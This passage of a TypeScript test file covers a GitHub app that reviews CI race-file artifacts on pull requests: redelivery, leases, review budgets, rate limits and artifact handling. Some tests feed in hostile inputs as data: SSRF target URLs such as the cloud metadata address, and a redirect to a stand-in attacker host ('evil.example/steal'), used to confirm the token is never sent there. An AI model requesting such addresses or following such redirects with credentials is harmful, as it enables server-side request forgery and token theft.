    await deliver(env, "installation", installationCreated({ repository_selection: "all" }), { fetch: gh.fetch });
    // two pull requests at the same commit, and its test run finishes
    await pullRequest(env, gh, "opened", 12, SHA1);
    await pullRequest(env, gh, "opened", 13, SHA1);
    const run = gh.addRun(SHA1);
    let slow = true;
    const base = gh.fetch;
    const fetch: typeof gh.fetch = async (u, i) => {
      if (slow && u.includes("/actions/runs?")) advance(16_000);
      return base(u, i);
    };
    const id = "cccccccc-2222-4333-8444-555555555555";
    const mark = gh.calls.length;
    const res = await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch, id });
    expect(await result(res)).toBe("failed: deadline");
    // the first pull request was reviewed; the second was not started (nothing was asked of GitHub about it), and its row says a review is owed
    expect(gh.calls.slice(mark).some((c) => c.path.endsWith("/pulls/12"))).toBe(true);
    expect(gh.calls.slice(mark).some((c) => c.path.endsWith("/pulls/13"))).toBe(false);
    expect(sql.rows("SELECT number, due IS NOT NULL AS due, lease FROM github_prs ORDER BY number")).toEqual([
      { number: 12, due: 0, lease: null },
      { number: 13, due: 1, lease: null },
    ]);
    expect(gh.summary(13)).toBeNull();
    expect(sql.rows("SELECT id FROM github_deliveries WHERE id = ?", id)).toEqual([]);
    slow = false;
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch, id }))).toBe("findings");
    expect(gh.summary(13)).toContain("**2 findings**");
  });

  it("a delivery whose job the platform stopped can be redelivered a minute later; one whose job ended is never run twice", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    // taken, and then nothing: neither done nor forgotten (no code ran after the cut)
    const id = "dddddddd-2222-4333-8444-555555555555";
    expect(await claimDelivery(env.DB!, id, "installation", now())).toBe(true);
    expect(await (await deliver(env, "installation", installationCreated(), { fetch: gh.fetch, id })).json()).toEqual({ ok: true, duplicate: true });
    advance(59_000);
    expect(await (await deliver(env, "installation", installationCreated(), { fetch: gh.fetch, id })).json()).toEqual({ ok: true, duplicate: true });
    advance(2_000);
    expect(await result(await deliver(env, "installation", installationCreated(), { fetch: gh.fetch, id }))).toBe("created");
    expect(sql.rows("SELECT done IS NOT NULL AS done FROM github_deliveries WHERE id = ?", id)).toEqual([{ done: 1 }]);
    // it ended: however long ago, the same delivery is not run again
    advance(3_600_000);
    expect(await (await deliver(env, "installation", { ...installationCreated(), action: "deleted" }, { fetch: gh.fetch, id })).json()).toEqual({ ok: true, duplicate: true });
    expect(sql.rows("SELECT id FROM github_installations")).toEqual([{ id: INSTALLATION }]);
  });

  it("the check run's id is stored as soon as it exists: a failure at the comment does not lead to a second check run on the commit", async () => {
    const { env, sql } = githubSetup();
    let broken = true;
    const gh = fakeGithub({ answer: (c) => (broken && c.method === "POST" && /\/issues\/\d+\/comments$/.test(c.path) ? new Response("{}", { status: 502 }) : undefined) });
    await deliver(env, "installation", installationCreated({ repository_selection: "all" }), { fetch: gh.fetch });
    await pullRequest(env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("failed: server");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(sql.rows("SELECT check_run_id FROM github_prs")[0]!.check_run_id).toBeGreaterThan(0);
    broken = false;
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.posted(12)).toHaveLength(1);
  });
});

describe("github app: an old or misordered delivery (src/github/handlers.ts header)", () => {
  it("a pull_request delivery for an older commit does not move the row, the check or the comment back", async () => {
    const { env, gh, sql } = await reviewed();
    // the next commit is pushed and reviewed
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    const run = gh.addRun(SHA2);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.summary(12)).toContain("at `2222222`");
    const before = { checks: gh.checks.size, body: gh.summary(12), row: sql.rows("SELECT head_sha, check_run_id, comment_id FROM github_prs")[0] };
    // the delivery for SHA1 arrives again (Redeliver, or GitHub delivering out of order): GitHub says the head is SHA2
    const mark = gh.calls.length;
    await deliver(env, "pull_request", pullEvent("synchronize", 12, SHA1), { fetch: gh.fetch });
    expect(gh.calls.slice(mark).filter((c) => c.method !== "GET")).toEqual([]);
    expect(gh.checks.size).toBe(before.checks);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.summary(12)).toBe(before.body);
    expect(sql.rows("SELECT head_sha, check_run_id, comment_id FROM github_prs")[0]).toEqual(before.row);
    // so the test runs and Re-run of the head commit still find the pull request
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("findings");
  });

  it("an old `opened` does not reopen a pull request that closed, and an old `closed` does not close one that was reopened", async () => {
    const { env, gh, sql } = await reviewed();
    await pullRequest(env, gh, "closed", 12, SHA1, { state: "closed" });
    expect(sql.rows("SELECT closed IS NOT NULL AS closed FROM github_prs")).toEqual([{ closed: 1 }]);
    // the old delivery says "open"; GitHub says closed
    expect(await result(await deliver(env, "pull_request", pullEvent("synchronize", 12, SHA1), { fetch: gh.fetch }))).toBe("closed");
    expect(sql.rows("SELECT closed IS NOT NULL AS closed FROM github_prs")).toEqual([{ closed: 1 }]);
    // reopened for real
    expect(await result(await pullRequest(env, gh, "reopened", 12, SHA1))).toBe("findings");
    expect(sql.rows("SELECT closed FROM github_prs")).toEqual([{ closed: null }]);
    // the old `closed` delivery arrives again: GitHub says open, so the row stays open and its test runs still find it
    expect(await result(await deliver(env, "pull_request", pullEvent("closed", 12, SHA1, { state: "closed" }), { fetch: gh.fetch }))).toBe("not closed");
    expect(sql.rows("SELECT closed FROM github_prs")).toEqual([{ closed: null }]);
    expect(await result(await deliver(env, "workflow_run", runEvent(gh.runs.get(REPO.full_name)![0]!.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
  });
});

describe("github app: the lease (src/github/store.ts takeLease)", () => {
  const key = { repoId: REPO.id, number: 12, installationId: INSTALLATION };

  it("an event that finds the lease taken marks it only while it is held; when the holder has just let go, the event takes the lease itself", async () => {
    const { env, sql } = githubSetup();
    const db = env.DB!;
    expect(await takeLease(db, key, now())).not.toBeNull();
    // A second event tries for the lease and fails. Before its mark reaches the database, the holder lets go.
    let letGo = false;
    const racing: typeof db = {
      ...db,
      prepare: (q) => {
        if (/SET pending/.test(q) && !letGo) {
          letGo = true;
          sql.db.prepare("UPDATE github_prs SET lease = NULL").run();
        }
        return db.prepare(q);
      },
    };
    const got = await takeLease(racing, key, now());
    expect(letGo).toBe(true);
    // not a mark on a row nobody holds (which nobody would read): the event holds the lease and does the review
    expect(got).not.toBeNull();
    expect(sql.rows("SELECT lease IS NOT NULL AS held, pending FROM github_prs")).toEqual([{ held: 1, pending: 0 }]);

    // while the lease is live the mark is made, and the holder reads it when it lets go: 1 for an event, 2 for a person's request
    expect(await takeLease(db, key, now())).toBeNull();
    expect(await releaseLease(db, REPO.id, 12, { lease: got!.lease })).toBe(1);
    const again = await takeLease(db, key, now());
    expect(sql.rows("SELECT pending FROM github_prs")).toEqual([{ pending: 0 }]);
    expect(await takeLease(db, { ...key, asked: true }, now())).toBeNull();
    expect(await takeLease(db, key, now())).toBeNull();
    // only the holder's own lease is let go
    expect(await releaseLease(db, REPO.id, 12, { lease: "2026-01-01T00:00:00.000Z" })).toBe(0);
    expect(sql.rows("SELECT lease IS NOT NULL AS held FROM github_prs")).toEqual([{ held: 1 }]);
    expect(await releaseLease(db, REPO.id, 12, { lease: again!.lease, due: null })).toBe(2);
    expect(sql.rows("SELECT lease, due FROM github_prs")).toEqual([{ lease: null, due: null }]);
  });

  it("an event that arrived while a pass ran is not lost when that pass fails: the review runs once more", async () => {
    const { env, sql } = githubSetup();
    let failures = 2;
    const gh = fakeGithub({
      answer: (c) => {
        if (failures > 0 && c.path.endsWith("/actions/runs")) {
          failures--;
          // another event for this pull request arrives while GitHub fails this pass
          sql.db.prepare("UPDATE github_prs SET pending = 1 WHERE number = 12").run();
          return new Response("{}", { status: 502 });
        }
        return undefined;
      },
    });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    const id = "eeeeeeee-2222-4333-8444-555555555555";
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(failures).toBe(0);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(sql.rows("SELECT lease, pending, due FROM github_prs")).toEqual([{ lease: null, pending: 0, due: null }]);
    expect(id).toBeTruthy();
  });

  it("a person's request that arrives during an automatic pass is run as a request, also where the automatic pass was left out by a setting", async () => {
    const { env } = githubSetup();
    let asked = false;
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "reviews: false\n");
    const fetch: typeof gh.fetch = async (u, i) => {
      // while the automatic pass asks for the pull request, someone comments `review`: the lease is taken, so it is marked
      if (!asked && u.endsWith("/pulls/12")) {
        asked = true;
        expect(await takeLease(env.DB!, { ...key, asked: true }, now())).toBeNull();
      }
      return gh.fetch(u, i);
    };
    await deliver(env, "installation", installationCreated({ repository_selection: "all" }), { fetch });
    expect(await result(await pullRequest(env, { ...gh, fetch }, "opened", 12, SHA1))).toBe("no race files");
    // the first pass stopped at "automatic reviews are off"; the second ran as the person's request and answered
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0].output.title).toBe("No race files for this commit");
  });
});

describe("github app: review budgets (docs/github-app/README.md, \"Limits\")", () => {
  const usage = (sql: ReturnType<typeof githubSetup>["sql"]) => sql.rows("SELECT reviews, outside FROM github_usage")[0] ?? { reviews: 0, outside: 0 };

  it("the installation's hour is counted only for a review that reads a commit's evidence: a pull request that a setting leaves out costs none of it", async () => {
    const { env, gh, sql } = await reviewed({}, 'reviews:\n  ignore_authors: ["mallory"]\n  branches: [main]\n');
    // one review read evidence so far (the test run's); the open before it found no finished run and counted nothing
    expect(usage(sql)).toEqual({ reviews: 1, outside: 0 });
    const reviews = sql.rows("SELECT reviews FROM github_prs WHERE number = 12")[0]!.reviews;
    const mallory = { author_association: "NONE", user: { id: 666, login: "mallory", type: "User" }, head: { sha: SHA2, ref: "p", repo: { id: 99001, full_name: "mallory/shop" } } };
    for (let i = 0; i < 5; i++) expect(await result(await pullRequest(env, gh, "synchronize", 20, SHA2, mallory))).toBe("author not reviewed");
    expect(await result(await pullRequest(env, gh, "opened", 21, SHA2, { draft: true }))).toBe("draft");
    expect(await result(await pullRequest(env, gh, "opened", 22, SHA2, { base: { ref: "experiment", repo: { id: REPO.id } } }))).toBe("base branch not reviewed");
    expect(usage(sql)).toEqual({ reviews: 1, outside: 0 });
    expect(sql.rows("SELECT number, reviews FROM github_prs WHERE number > 12 ORDER BY number")).toEqual([
      { number: 20, reviews: 0 },
      { number: 21, reviews: 0 },
      { number: 22, reviews: 0 },
    ]);
    expect(sql.rows("SELECT reviews FROM github_prs WHERE number = 12")[0]!.reviews).toBe(reviews);
  });

  it("one pull request cannot use up the installation's hour: it has its own, counted before anything is asked of GitHub", async () => {
    const { env, gh, sql } = await reviewed();
    const mine = () => Number(sql.rows("SELECT hour_reviews FROM github_prs WHERE number = 12")[0]!.hour_reviews);
    let n = 0;
    while (mine() < PR_REVIEWS_PER_HOUR) expect(await result(await pullRequest(env, gh, "synchronize", 12, n++ % 2 ? SHA2 : SHA3))).toBe("no race files");
    expect(PR_REVIEWS_PER_HOUR).toBeLessThan(REVIEWS_PER_HOUR / 2);
    const used = usage(sql);
    expect(used.reviews).toBeLessThanOrEqual(PR_REVIEWS_PER_HOUR);
    const before = gh.calls.length;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("over the pull request's hourly budget");
    expect(gh.calls.length).toBe(before);
    expect(usage(sql)).toEqual(used);
    // the review it did not get is owed, and a person who asks is told
    expect(sql.rows("SELECT due IS NOT NULL AS due FROM github_prs WHERE number = 12")).toEqual([{ due: 1 }]);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "/genclass review"), { fetch: gh.fetch }))).toBe("over the pull request's hourly budget");
    expect(gh.posted(12).at(-1)).toContain(`This pull request reached the app's limit of ${PR_REVIEWS_PER_HOUR} reviews an hour`);
    // every other pull request of the installation is reviewed as before, and this one again in the next hour
    expect(await result(await pullRequest(env, gh, "opened", 13, SHA2))).toBe("no race files");
    expect(gh.checksAt(SHA2).length).toBeGreaterThan(0);
    advance(3_600_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("findings");
  });

  it("pull requests by authors from outside the repository use at most half the hour, and pushes leave part of it to test runs and people", async () => {
    const { env, gh, sql } = await reviewed();
    const fork = (sha: string) => ({ author_association: "NONE", user: { id: 666, login: "mallory", type: "User" }, head: { sha, ref: "p", repo: { id: 99001, full_name: "mallory/shop" } } });
    // an outsider's pull request is counted as such
    expect(await result(await pullRequest(env, gh, "opened", 20, SHA2, fork(SHA2)))).toBe("no race files");
    expect(usage(sql)).toEqual({ reviews: 2, outside: 1 });
    // outsiders' pull requests have had their half
    sql.db.prepare("UPDATE github_usage SET reviews = ?, outside = ?").run(OUTSIDE_REVIEWS_PER_HOUR, OUTSIDE_REVIEWS_PER_HOUR);
    expect(await result(await pullRequest(env, gh, "synchronize", 20, SHA3, fork(SHA3)))).toBe("over the hourly budget");
    expect(gh.checksAt(SHA3)).toEqual([]);
    // a member's pull request is reviewed all the same
    expect(await result(await pullRequest(env, gh, "opened", 13, SHA3))).toBe("no race files");
    expect(gh.checksAt(SHA3)).toHaveLength(1);
    expect(usage(sql)).toEqual({ reviews: OUTSIDE_REVIEWS_PER_HOUR + 1, outside: OUTSIDE_REVIEWS_PER_HOUR });

    // pushes stop at their share; a test run that uploaded race files and a person who asks do not
    sql.db.prepare("UPDATE github_usage SET reviews = ?, outside = 0").run(PUSH_REVIEWS_PER_HOUR);
    expect(await result(await pullRequest(env, gh, "synchronize", 13, SHA2))).toBe("over the hourly budget");
    const run = gh.addRun(SHA2);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("findings");
    expect(await result(await deliver(env, "issue_comment", commentEvent(13, "/genclass review"), { fetch: gh.fetch }))).toBe("findings");
    expect(Number(usage(sql).reviews)).toBeGreaterThan(PUSH_REVIEWS_PER_HOUR);
  });
});

describe("github app: evidence that cannot be read (src/github/review.ts header)", () => {
  const FAIL_ON = "check:\n  fail_on: reproducible\n";
  const rerun = (sha: string) => ({ action: "rerequested", check_run: { id: 1, head_sha: sha, app: { id: Number(APP_ID) } }, repository: REPO, installation: { id: INSTALLATION } });

  it("fail_on: race files that cannot be read again do not replace the failing result a commit already has", async () => {
    const { env, gh, sql, run } = await reviewed({}, FAIL_ON);
    const failing = gh.checksAt(SHA1)[0];
    expect(failing).toMatchObject({ status: "completed", conclusion: "failure" });
    const body = gh.summary(12);
    // a week later the artifact has expired, and someone clicks Re-run on the check, or asks for a review
    run.expired = ["genclass-races"];
    advance(8 * 86_400_000);
    const mark = gh.calls.length;
    expect(await result(await deliver(env, "check_run", rerun(SHA1), { fetch: gh.fetch }))).toBe("race files not read again");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review"), { fetch: gh.fetch }))).toBe("race files not read again");
    expect(gh.calls.slice(mark).filter((c) => c.method !== "GET" && !c.path.includes("/reactions") && !c.path.includes("access_tokens"))).toEqual([]);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0]).toEqual(failing);
    expect(gh.summary(12)).toBe(body);
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).findings.map((f) => f.status)).toEqual(["new", "new"]);
  });

  it("fail_on: one of two artifacts cannot be downloaded on a second read: its findings stay as they were, and the check still fails", async () => {
    const { env } = githubSetup();
    let failing = false;
    const gh = fakeGithub({ answer: (c) => (failing && /\/actions\/artifacts\/\d+00\/zip$/.test(c.path) ? new Response("{}", { status: 500 }) : undefined) });
    gh.settings.set(REPO.full_name, FAIL_ON);
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(env, gh, "opened", 12, SHA1);
    // two shards: the reproducible finding is in the first artifact's files
    const run = gh.addRun(SHA1, {
      "genclass-1": racesZip({ "a.json": raceFile("checkout-1.json"), "b.json": raceFile("checkout-2.json") }),
      "genclass-2": racesZip({ "c.json": raceFile("search-1.json"), "d.json": raceFile("search-2.json") }),
    });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ conclusion: "failure" });
    expect(gh.checksAt(SHA1)[0].output.title).toBe("2 findings, 1 reproducible");
    // read again, and the first artifact's download fails
    failing = true;
    expect(await result(await deliver(env, "check_run", rerun(SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "failure" });
    expect(gh.checksAt(SHA1)[0].output.title).toBe("2 findings, 1 reproducible");
    expect(gh.checksAt(SHA1)[0].output.summary).toContain('Note: The artifact "genclass-1" could not be downloaded.');
    expect(gh.summary(12)).toContain("| 1 | New | Duplicate submit · `POST /api/orders` |");
    expect(gh.summary(12)).not.toContain("Test not in this run");
  });

  it("a commit whose artifacts could be read only in part is never a success", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await pullRequest(env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1, { "genclass-corrupt": new TextEncoder().encode("this is not a zip archive at all"), "genclass-races": racesZip({ "c.json": raceFile("search-1.json") }) });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("nothing flagged");
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(gh.checksAt(SHA1)[0].output.title).toBe("Nothing flagged in 1 test");
    expect(gh.checksAt(SHA1)[0].output.summary).toContain('Note: The artifact "genclass-corrupt" could not be opened');
    // an artifact with no .json file in it is not a file that went unread: the check is a success
    const ok = githubSetup();
    const g2 = fakeGithub();
    await pullRequest(ok.env, g2, "opened", 12, SHA1);
    const r2 = g2.addRun(SHA1, { "genclass-report": racesZip({ "report.md": "# report" }), "genclass-races": racesZip({ "c.json": raceFile("search-1.json") }) });
    expect(await result(await deliver(ok.env, "workflow_run", runEvent(r2.id, SHA1), { fetch: g2.fetch }))).toBe("nothing flagged");
    expect(g2.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "success" });
  });

  it("files that are not race files: \"No race file could be read\", neutral, never \"Nothing flagged in 0 tests\" with a green check", async () => {
    const other = { "results.json": '{"suites":[],"stats":{"expected":3}}', "package.json": '{"name":"x"}' };
    for (const settings of [undefined, "check:\n  fail_on: any\n"]) {
      const { env, sql } = githubSetup();
      const gh = fakeGithub();
      if (settings) gh.settings.set(REPO.full_name, settings);
      await deliver(env, "installation", installationCreated({ repository_selection: "all" }), { fetch: gh.fetch });
      await pullRequest(env, gh, "opened", 12, SHA1);
      const run = gh.addRun(SHA1, { "genclass-races": racesZip(other) });
      // files that are not race files are not race files read: a repository nothing was read for stays silent
      expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("no race files");
      expect(gh.checks.size).toBe(0);
      // a person who asks is told
      expect(await result(await deliver(env, "issue_comment", commentEvent(12, "/genclass review"), { fetch: gh.fetch }))).toBe("no race file could be read");
      const [check] = gh.checksAt(SHA1);
      expect(check).toMatchObject({ status: "completed", conclusion: "neutral" });
      expect(check.output.title).toBe("No race file could be read");
      expect(check.output.summary).toContain("No race file could be read for `1111111`: 2 files skipped.");
      expect(check.output.summary).not.toContain("Nothing flagged");
      expect(check.output.text).toContain("`genclass-races/results.json`");
      expect(gh.posted(12)).toEqual([]);
      // nothing was learned about the commit's tests, and no race file was read for the repository
      expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).evidence).toBeNull();
      expect(sql.rows("SELECT * FROM github_repo_facts")).toEqual([]);
    }
    // earlier findings keep their status: an unreadable run is not a run without them
    const { env, gh, sql } = await reviewed();
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    const bad = gh.addRun(SHA2, { "genclass-races": racesZip(other) });
    expect(await result(await deliver(env, "workflow_run", runEvent(bad.id, SHA2), { fetch: gh.fetch }))).toBe("no race file could be read");
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ conclusion: "neutral" });
    expect(gh.summary(12)).toContain("No race file could be read for `2222222`: 2 files skipped.");
    expect(gh.summary(12)).toContain("| 1 | New | Duplicate submit");
    expect(gh.summary(12)).not.toContain("Test not in this run");
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).evidence).toBe(SHA1);
  });
});

describe("github app: limits", () => {
  it("one review at a time per pull request: an event that arrives meanwhile is picked up by the review that is running", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    // another review holds the lease
    await takeLease(env.DB!, { repoId: REPO.id, number: 12, installationId: INSTALLATION }, now());
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("busy");
    expect(gh.calls).toEqual([]);
    expect(sql.rows("SELECT pending FROM github_prs")[0]!.pending).toBe(1);
    // a lease that was never let go (a job the platform stopped) is taken over after 35 seconds, not before
    advance(34_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("busy");
    advance(2_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("no race files");
    expect(sql.rows("SELECT lease, pending FROM github_prs")[0]).toEqual({ lease: null, pending: 0 });
  });

  it("a review that is running goes round once more when something arrived while it ran", async () => {
    const { env } = githubSetup();
    let mark: (() => Promise<void>) | null = null;
    const gh = fakeGithub({
      answer: (c) => {
        // while the first pass lists the runs, another event for the same pull request arrives
        if (c.path.endsWith("/actions/runs") && mark) void mark();
        return undefined;
      },
    });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    let marked = false;
    mark = async () => {
      if (marked) return;
      marked = true;
      await env.DB!.prepare("UPDATE github_prs SET pending = 1 WHERE repo_id = ? AND number = 12").bind(REPO.id).run();
    };
    gh.pulls.set(`${REPO.full_name}#12`, pullEvent("opened", 12, SHA1).pull_request);
    await pullRequest(env, gh, "opened", 12, SHA1);
    // two passes, and each asked GitHub for the pull request: an event's copy of it is never trusted
    expect(gh.calls.filter((c) => c.path.endsWith("/actions/runs"))).toHaveLength(2);
    expect(gh.calls.filter((c) => c.path === "/repos/acme/shop/pulls/12")).toHaveLength(2);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
  });

  it("GitHub's rate limit ends the job quietly and nothing more is asked until the time GitHub named", async () => {
    const { env } = githubSetup();
    let limited = true;
    const gh = fakeGithub({ answer: (c) => (limited && c.path.endsWith("/actions/runs") ? new Response(JSON.stringify({ message: "API rate limit exceeded for installation." }), { status: 403, headers: { "x-ratelimit-remaining": "0", "x-ratelimit-reset": String(Math.floor(now().getTime() / 1000) + 600) } }) : undefined) });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    const r = await pullRequest(env, gh, "opened", 12, SHA1);
    expect(r.status).toBe(502);
    expect(await result(r)).toBe("failed: rate_limited");
    expect(limitedFor(`i${INSTALLATION}`, now().getTime())).toBeGreaterThan(now().getTime());
    limited = false;
    const before = gh.calls.length;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("failed: rate_limited");
    expect(gh.calls.length).toBe(before);
    advance(601_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("no race files");
  });

  it("a secondary limit without a time backs off a minute; an installation's hourly budget stops reviews, not the hour after", async () => {
    const { env, sql } = githubSetup();
    let abuse = true;
    const gh = fakeGithub({ answer: (c) => (abuse && c.method === "POST" && c.path.endsWith("/check-runs") ? new Response(JSON.stringify({ message: "You have exceeded a secondary rate limit." }), { status: 403 }) : undefined) });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("failed: rate_limited");
    abuse = false;
    advance(30_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("failed: rate_limited");
    advance(31_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("no race files");

    // race files are read once, so from here a push starts a review that reads the commit's evidence, which is what the hour counts
    const run = gh.addRun(SHA1);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    sql.db.prepare("UPDATE github_usage SET reviews = ?").run(REVIEWS_PER_HOUR);
    const before = gh.calls.length;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("over the hourly budget");
    // the pull request was asked for; nothing of the commit was read and nothing was written
    expect(gh.calls.slice(before).map((c) => `${c.method} ${c.path}`)).toEqual(["GET /repos/acme/shop/pulls/12"]);
    expect(gh.checksAt(SHA2)).toEqual([]);
    advance(3_600_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("no race files");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
  });

  it("an artifact that is too large, corrupt or full of other things is noted, never trusted", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await pullRequest(env, gh, "opened", 12, SHA1);
    const big = new Uint8Array(5 * 1024 * 1024);
    const run = gh.addRun(SHA1, { "genclass-big": big, "genclass-corrupt": new TextEncoder().encode("this is not a zip archive at all"), "genclass-races": racesZip() });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    const body = gh.summary(12)!;
    expect(body).toContain("Note: The artifact \"genclass-big\" is larger than this review reads (4 MB)");
    expect(body).toContain("Note: The artifact \"genclass-corrupt\" could not be opened");
    expect(body).toContain("**2 findings**");
    // the oversized one was never downloaded
    expect(gh.storage).toHaveLength(2);
  });

  it("an artifact's address is followed only to a public https host, and never with the token", async () => {
    for (const bad of ["http://169.254.169.254/latest/meta-data/", "https://10.0.0.8/a.zip", "https://localhost/a.zip", "http://127.0.0.1:9/a.zip", "https://user:pw@storage.example/a.zip", "ftp://storage.example/a.zip", "/relative/a.zip"]) expect(publicDownloadUrl(bad), bad).toBeNull();
    expect(publicDownloadUrl("https://productionresults.blob.core.windows.net/x/a.zip?sig=abc")).toBe("https://productionresults.blob.core.windows.net/x/a.zip?sig=abc");
    const { env } = githubSetup();
    const elsewhere: string[] = [];
    const gh = fakeGithub({ answer: (c) => (c.path.endsWith("/zip") ? new Response(null, { status: 302, headers: { location: "http://169.254.169.254/latest/meta-data/" } }) : undefined) });
    const fetch: typeof gh.fetch = async (u, i) => {
      if (!u.startsWith(API) && !u.startsWith(STORAGE)) elsewhere.push(u);
      return gh.fetch(u, i);
    };
    await pullRequest(env, { ...gh, fetch }, "opened", 12, SHA1);
    const run = gh.addRun(SHA1);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch }))).toBe("no race files");
    expect(elsewhere).toEqual([]);
    expect(gh.storage).toEqual([]);
    // no race file was read for the repository, so its one check still stands as it was; a person who asks is told what went wrong
    expect(gh.checksAt(SHA1)[0].output.title).toBe("No race files to read yet");
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "/genclass review"), { fetch }))).toBe("no race files");
    expect(elsewhere).toEqual([]);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0].output.summary).toContain('Note: The artifact "genclass-races" could not be downloaded.');
  });

  it("a moved repository's redirect is followed inside GitHub's API and nowhere else", async () => {
    const { env } = githubSetup();
    let moved = true;
    const gh = fakeGithub({
      answer: (c, url) => (moved && c.path === "/repos/acme/shop/actions/runs" ? new Response(null, { status: 301, headers: { location: `${API}/repos/acme/shop/actions/runs?moved=1&${url.searchParams}` } }) : undefined),
    });
    // the first request is redirected, the second (the same path, at the address GitHub named) is answered
    const seen: string[] = [];
    const fetch: typeof gh.fetch = async (u, i) => {
      seen.push(u);
      if (u.includes("moved=1")) moved = false;
      const r = await gh.fetch(u, i);
      if (u.includes("moved=1")) moved = true;
      return r;
    };
    expect(await result(await pullRequest(env, { ...gh, fetch }, "opened", 12, SHA1))).toBe("no race files");
    expect(seen.filter((u) => u.includes("/actions/runs"))).toHaveLength(2);
    // a redirect that leaves the API is an error: the token is not sent after it
    const out = githubSetup();
    const g2 = fakeGithub({ answer: (c) => (c.path === "/repos/acme/shop/actions/runs" ? new Response(null, { status: 302, headers: { location: "https://evil.example/steal" } }) : undefined) });
    const went: string[] = [];
    const f2: typeof g2.fetch = async (u, i) => {
      went.push(u);
      return g2.fetch(u, i);
    };
    expect(await result(await pullRequest(out.env, { ...g2, fetch: f2 }, "opened", 12, SHA1))).toBe("failed: unexpected");
    expect(went.some((u) => u.includes("evil.example"))).toBe(false);
  });

  it("the daily sweep drops handled delivery ids after a week, hourly counts after two days and closed pull requests after a month", async () => {
    const { env, gh, sql } = await reviewed();
    await pullRequest(env, gh, "closed", 12, SHA1, { state: "closed" });
    await githubRetention(env.DB!, now());
    expect(sql.rows("SELECT COUNT(*) AS n FROM github_deliveries")[0]!.n).toBeGreaterThan(0);
    expect(sql.rows("SELECT COUNT(*) AS n FROM github_prs")[0]!.n).toBe(1);
    advance(8 * 86_400_000);
    await githubRetention(env.DB!, now());
    expect(sql.rows("SELECT * FROM github_deliveries")).toEqual([]);
    expect(sql.rows("SELECT * FROM github_usage")).toEqual([]);
